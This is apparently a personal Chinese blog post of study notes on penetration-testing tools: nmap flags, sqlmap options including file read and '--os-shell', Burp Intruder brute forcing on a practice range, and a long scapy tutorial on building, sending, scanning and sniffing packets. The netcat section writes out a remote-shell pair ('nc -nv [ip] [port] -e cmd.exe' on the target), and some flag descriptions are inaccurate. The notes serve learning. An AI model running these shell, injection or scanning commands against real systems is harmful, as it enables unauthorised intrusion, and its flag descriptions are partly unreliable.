---
title: tools help
date: 2022-01-22 11:32:54
tags:
      - tools
      - 安全
      - nmap
categories:
      - 安全
description: 收集日常使用的渗透工具以及框架，在这里进行一波笔记的整理
keywords:
      - nmap
      - sqlmap
      - burpsuite
      - nc
      - scapy
top_img: /img/tools.png
cover: /img/tools.png
---

# tools 

## nmap

nmap：一款端口扫描工具

使用方法以及参数如下

==在这里$ 代表ip或者url==

> nmap $
>
> - -v:显示详细信息
> - -p:指定端口
>   - -p 80,8080
> - -O:扫描目标是什么操作系统,使用的什么协议
> - -iL 文件:扫描指定文件的ip
> - -V:版本检测 用于扫描目标主机服务版本号. 探测打开的端口以确定服务/版本信息
> - -sA:综合模式扫描
> - -sS:安全模式扫描
> - -sL:list扫描
> - -sT:使用tcp扫描模式
> - -sF:快速扫描
> - -sR:RPC扫描
> - -sn:测试存活主机
> - -U:测试那些udp开放
> - -X:表示以xml的格式输出结果到以文件
> - -P:ping探测
> - -Pn:跳过主机存活扫描过程
> - -P0:ip检测协议是否开启
> - -T:设定模板(越高越快)
>
> 常用
>
> nmap -sS $
>
> nmap -sA -T 4 $



## SQLmap

nginx /etc/nginx/nginx.conf



一款sql注入测试工具



sqlmap -r 文件名

sqlmap -u url或者域名

哪个位置需要进行注入就在哪个位置加==\*==,如下

> sqlmap -u http://localhost/?id=111\*&kkk=aaa

这样就可以对id进行注入了(文件中也一样)

下面是常用命令

>- --dbs:获取所有的数库
>- --current-db:获取当前的数据库
>- --threads 10:开启10个线程
>- --data id=111&password=222:使用post提交,并且表单为id和password
>- --tables -D "库":获取指定数据库的所有表
>- --columns -T "表名称" -D "库名":获取指定库名的表中所有字段
>- --dump -T "表名称" -D "库名" -C "字段":获取指定按照指定的库名表名字段来获取数据库的数据
>- --cookie:使用cookie
>- --file-read"读取的文件夹位置":读取某个文件
>- --file-write "绝对路径":写入文件到某个绝对路径中
>- --batch:自动yes
>- --risk 3:执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
>- --referer "":使用referer欺骗
>- --user-agent "":自定义user-agent
>- --proxy "目标地址":使用代理注入
>-  -v  详细的等级(0-6)
>            0：只显示Python的回溯，错误和关键消息。
>            1：显示信息和警告消息。
>            2：显示调试消息。
>            3：有效载荷注入。
>            4：显示HTTP请求。
>            5：显示HTTP响应头。
>            6：显示HTTP响应页面的内容
>- --os-shell(需要绝对路径和语言):获取shell



## Burp



是一个数据包捕获软件

首先我们可以设置代理

![image-20220122160622437](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-1.png)

然后去浏览器设置代理以火狐为例子

去设置里面的高级---网络---代理

![image-20220122161034011](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-2.png)

然后安装协议首先访问http://burp

然后下载证书,然后进入设置,高级---证书---证书机构---导入   这样导入证书

![image-20220122161254985](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-3.png)



#### 使用本地的DNS

![image-20220122161507557](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-4.png)



选择这个打开dns服务器,然后就可以使用并看到结果了

![image-20220122161604192](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-5.png)



当我们抓取到数据后就可以进行参数设置,当我们进行post提交的时候有时需要进行编码的调整如:==%00需要被编码否则传输过程中可能会丢失,而且%00进行base64时会被丢失==



![image-20220122162024999](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-6.png)

Send to Intruder和Send to Repeater的时候不能选择东西否则只会进行选择部分的测试



#### 首先介绍一下Send to Intruder    暴力破解

pikaqiu靶场

暴力破解第一题

首先单击请求进行请求

![image-20220119151356569](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-7.png)

然后抓到包后ctrl+i

![image-20220119151545986](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-8.png)



然后进入如下模块并对破解点进行添加

![image-20220119151700990](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-9.png)



![image-20220119154920801](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-10.png)

设置一个type然后进入payloads

![image-20220119155535580](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-11.png)

设置线程数量

![image-20220119155617982](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-12.png)

设置正则获取页面数据

![image-20220119155652450](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-13.png)



单机add设置正则

![image-20220119155849551](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-14.png)



![image-20220119160023712](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-15.png)



设置每次攻击前重新获取token就要进行重定向

![image-20220119160133327](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-16.png)



## nc

一个进行远程命令控制的



黑客电脑的nc运行如下命令

nc -lvp [端口号]



靶机运行如下命令

nc -nv [ip] [端口] -e cmd.exe





>- -l:将nc监听模式运行
>- -k:接受一个请求不会结束而是继续监听





## scapy---这东西真好玩

下面是官方源码地址:

> https://github.com/secdev/scapy/blob/master/scapy/sessions.py



### 准备环境

![image-20220129180955360](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-4.png)



官方目前给出python对应的scapy版本  目前时间为:`2022-1-29`



首先下载安装

`pip install scapy`，然后在命令行中输入scapy即可运行交互的scapy

> 如果显示没有找到包则证明环境变量不对,我以win10为例子来说明一下

![image-20220129175922805](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-1.png)

必须包含你python的Scripts在环境变量中

kali也是直接安装(kali是ubuntu那一支的)`pip install scapy`,然后还需要:

> apt-get install tcpdump



然后我们还有几个可能用到的依赖

> pip install matplotlib	 //作图
>
> pip install pyx				//二维
>
> 但是如果要使用pyx需要安装 [texlive (Unix)](http://www.tug.org/texlive/) 或 [MikTex (Windows)](https://miktex.org/) 
>
> kali安装texlive方法`apt-get install texlive`
>
> 
>
> 
>
> pip install vpython		//三维
>
> pip install cryptography //WEP解密





### 文档地址

> 中文文档
>
> https://www.osgeo.cn/scapy/usage.html
>
> 英文文档
>
> https://scapy.readthedocs.io/en/latest/usage.html

建议这俩组合起来看,否则你就会遇见下面这种翻译,这tm不是机翻我真不信

![img](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-2.png)



![111](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-3.png)



(不要问我为啥不直接看英文的)



### 开始使用!!

运行交互环境

> scapy   



#### 自定义主题

> conf.color_theme = BrightTheme()
>
> 下面是常用主题
>
> ```
> DefaultTheme, BrightTheme, RastaTheme, ColorOnBlackTheme, BlackAndWhite, HTMLTheme, LatexTheme
> ```



#### 构建IP包

>a=IP()
>
>设置属性
>
>a.dst="192.168.1.1"
>
>删除属性
>
>del(a.dst)



> 合成包运算符(就算再python中也是这么用,我是没想到)
>
> `IP()`
> <IP |>
> `P()/TCP()`
> <IP frag=0 proto=TCP |<TCP |>>
>
> `Ether()/IP()/TCP()`
>
> <Ether  type=IPv4 |<IP  frag=0 proto=tcp |<TCP  |>>>
>
> `IP()/TCP()/"GET / HTTP 1.1 \n\n"`
>
> <IP  frag=0 proto=tcp |<TCP  |<Raw  load='GET / HTTP 1.1 \n\n' |>>>



#### 构造包和分解包

> `raw(IP())`
>
> b'E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01'
>
> `IP(_)`
>
> <IP  version=4 ihl=5 tos=0x0 len=20 id=1 flags= frag=0 ttl=64 proto=hopopt chksum=0x7ce7 src=127.0.0.1 dst=127.0.0.1 |>
>
> ![image-20220129185254036](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-5.png)
>
> ![image-20220129185355181](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-6.png)

上面的e是使用函数对其进行补充后的包如果嫌他太臃肿可以使用`hide_defaults()来进行隐藏`

![image-20220129185707137](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-7.png)



#### 从PCAP中读取

```python
a=rdpcap("/spare/captures/isakmp.cap")
```

#### 将数据存为PDF或者PS

| Command                 | Effect                                   |
| ----------------------- | ---------------------------------------- |
| raw(pkt)                | 源数据                                   |
| hexdump(pkt)            | ==16进制源数据==                         |
| ls(pkt)                 | ==包列表,详细列出所有的包,的全名和属性== |
| pkt.summary()           | ==一条概括==                             |
| pkt.show()              | ==树状展示数据==                         |
| pkt.show2()             | 没看出来和上面的有啥区别                 |
| pkt.sprintf()           | 没试出来有啥用                           |
| pkt.decode_payload_as() | changes the way the payload is decoded   |
| pkt.psdump()            | 用解释的解剖绘制PostScript图表           |
| pkt.pdfdump()           | 用解释的解剖绘制PDF                      |
| pkt.command()           | 返回可生成数据包的scapy命令              |



#### https://scapy.readthedocs.io/en/latest/usage.html#generating-sets-of-packets

这一部分没看懂,好像是你生成了一个数据包的集合然后你要怎么从一个来获取全部??



#### 发送数据包

主要有两个函数

send()用于发送第三层的数据包,无响应接收

sendp()用于发送第二层的数据包,无响应接收



sr1()用于发送三层的数据包,有响应接收

srp()用于二层的数据包,有响应接收

![image-20220130110015724](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-8.png)



> 可以设置两个数据包之间的等待间隔使用inter参数(秒为单位)
>
> 如果某些包超时了,或者丢失了可以重传,使用retry参数来设置,如果retry=3则尝试重新发送三次未响应的数据包,如果retry=-3则重新发送未响应的数据包,并直到连续三次为止
>
> timeout用来指定最后一个数据包的等待时间
>
> 下面是例子:
>
> ```
> sr(IP(dst="172.20.29.5/30")/TCP(dport=[21,22,23]),inter=0.5,retry=-2,timeout=1)
> ```



#### 默认值修改函数

fuzz()

修改后的数值是随机的,操作如下

> send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)



#### 注入字节

在数据包中,所有的字段都有特定的类型,如果你想要注入不同的类型可以使用RawVal

> pkt = IP(len=RawVal(b"NotAnInteger"), src="127.0.0.1")



#### SYN扫描

![image-20220130111816301](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-9.png)

向百度发出请求,并且接收响应后退出,可以看出flags=SA表示该端口为开放端口

检测多个端口

> sr(IP(dst="192.168.1.1")/TCP(sport=666,dport=(440,443),flags="S"))
>
> 从440到443端口

> sr(IP(dst="192.168.1.1")/TCP(sport=RandShort(),dport=[440,441,442,443],flags="S"))
>
> 这样可以写成一个数组然后进行探测

如果没有设置变量可以是使用\_来获取探测结果

```
ans, unans = _
>>> ans.summary()
```

> ans.summary( lambda s,r: r.sprintf("%TCP.sport% \t %TCP.flags%") )

还可以和上面这种进行格式化输出



==make_table部分没看懂==



过滤flags只为SA



nsummary和summary的区别

![image-20220203190633834](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-12.png)

> ans.nsummary(lfilter = lambda s,r: r.sprintf("%TCP.flags%") == "SA")

对端口进行专门分析,并得出哪些是开放的

> ans.summary(lfilter = lambda s,r: r.sprintf("%TCP.flags%") == "SA",prn=lambda s,r: r.sprintf("%TCP.sport% is open"))

![image-20220130113405578](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-10.png)

懒得写了,也没法做测试,毕竟上个一测试我还没做完了

#### lsc()可查看大部分的函数

>PID_count          : Identify IP id values classes in a list of packets
>arpcachepoison      : Poison target's cache with (your MAC,victim's IP) couple
>arping              : Send ARP who-has requests to determine which hosts are up
>arpleak             : Exploit ARP leak flaws, like NetBSD-SA2017-002.
>bind_layers         : Bind 2 layers on some specific fields' values.
>bridge_and_sniff    : Forward traffic between interfaces if1 and if2, sniff and return
>chexdump            : Build a per byte hexadecimal representation
>computeNIGroupAddr  : Compute the NI group Address. Can take a FQDN as input parameter
>corrupt_bits        : 
>corrupt_bytes       : 
>defrag              : defrag(plist) -> ([not fragmented], [defragmented],
>defragment          : defragment(plist) -> plist defragmented as much as possible 
>dhcp_request        : Send a DHCP discover request and return the answer
>dyndns_add          : Send a DNS add message to a nameserver for "name" to have a new "rdata"
>dyndns_del          : Send a DNS delete message to a nameserver for "name"
>etherleak           : Exploit Etherleak flaw
>explore             : Function used to discover the Scapy layers and protocols.
>fletcher16_checkbytes: Calculates the Fletcher-16 checkbytes returned as 2 byte binary-string.
>fletcher16_checksum : Calculates Fletcher-16 checksum of the given buffer.
>fragleak            : --
>fragleak2           : --
>fragment            : Fragment a big IP datagram
>fuzz                : 
>getmacbyip          : Return MAC address corresponding to a given IP address
>getmacbyip6         : Returns the MAC address corresponding to an IPv6 address
>hexdiff             : Show differences between 2 binary strings
>hexdump             : Build a tcpdump like hexadecimal view
>hexedit             : Run hexedit on a list of packets, then return the edited packets.
>hexstr              : Build a fancy tcpdump like hex from bytes.
>import_hexcap       : Imports a tcpdump like hexadecimal view
>is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.
>linehexdump         : Build an equivalent view of hexdump() on a single line
>ls                  : List  available layers, or infos on a given layer class or name.
>neighsol            : Sends and receive an ICMPv6 Neighbor Solicitation message
>overlap_frag        : Build overlapping fragments to bypass NIPS
>promiscping         : Send ARP who-has requests to determine which hosts are in promiscuous mode
>rdpcap              : Read a pcap or pcapng file and return a packet list
>report_ports        : portscan a target and output a LaTeX table
>restart             : Restarts scapy
>rfc                 : 
>send                : 
>sendp               : 
>sendpfast           : Send packets at layer 2 using tcpreplay for performance
>sniff               : 
>split_layers        : Split 2 layers previously bound.
>sr                  : 
>sr1                 : 
>sr1flood            : Flood and receive packets at layer 3 and return only the first answer
>srbt                : send and receive using a bluetooth socket
>srbt1               : send and receive 1 packet using a bluetooth socket
>srflood             : Flood and receive packets at layer 3
>srloop              : Send a packet at layer 3 in loop and print the answer each time
>srp                 : 
>srp1                : 
>srp1flood           : Flood and receive packets at layer 2 and return only the first answer
>srpflood            : Flood and receive packets at layer 2
>srploop             : Send a packet at layer 2 in loop and print the answer each time
>tcpdump             : Run tcpdump or tshark on a list of packets.
>tdecode             : 
>traceroute          : Instant TCP traceroute
>traceroute6         : Instant TCP traceroute using IPv6
>traceroute_map      : Util function to call traceroute on multiple targets, then
>tshark              : Sniff packets and print them calling pkt.summary().
>wireshark           : 
>wrpcap              : Write a list of packets to a pcap file



#### 套接字

默认情况使用本地套接字，如果要使用手动的数据包捕获库函数就要安装下面的东西：

- 在UNIX/OSX上：确保安装了libpcap。
- 在Windows上：安装npcap/winpcap。（默认）

然后

conf.use_pcap=true

这时会自动使用

conf.L2socket和conf.L3socket

如果想要使用自定义的可以如下设置

>```
>conf.L3socket=L3pcapSocket  # Receive/send L3 packets through libpcap
>conf.L2listen=L2ListenTcpdump  # Receive L2 packets through TCPDump
>```



#### 嗅探

监听指定的包如下：

![image-20220203190331356](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-11.png)

然后可以使用

>a=_
>
>a[1]
>
>a.nsummary()
>
>来查看详细数据



sniff函数解析如下:

- filter:使用过滤规则

  - > sniff(filter="icmp and host 66.35.250.151")
    >
    >只保留icmp包和地址是66.35.250.151的数据包

- session:监听包的类型

  - IPSession:获取所有的IP包
  - TCPSession:获取所有的TCP包
  - TLSSession:匹配TLS会话//这个好像不存在了

- iface:指定监听网卡号

  - >sniff(iface="eth1")
    >
    >只保留eth1网卡的数据包

- prn:结果显示方式

  - >prn=lambda x: x.show()
    >
    >使用lambda来对数据用show来显示
    >
    >sniff(iface=["eth1","eth2"], prn=lambda x: x.sniffed_on+": "+x.summary())
    >
    >x.sniffed_on代表根据,如下的eth0
    >
    >![image-20220203191845601](D:\Code\pojo\Blog\BlogHexo\public\img\scapy-13.png)

操作系统识别:可以使用ping的TTL来识别,不过可能会被伪装,<64的操作系统是Linux或者unix反之则是Windows



异步嗅探:



AsyncSniffer使用这个来代替sniff就可以了参数和sniff一样



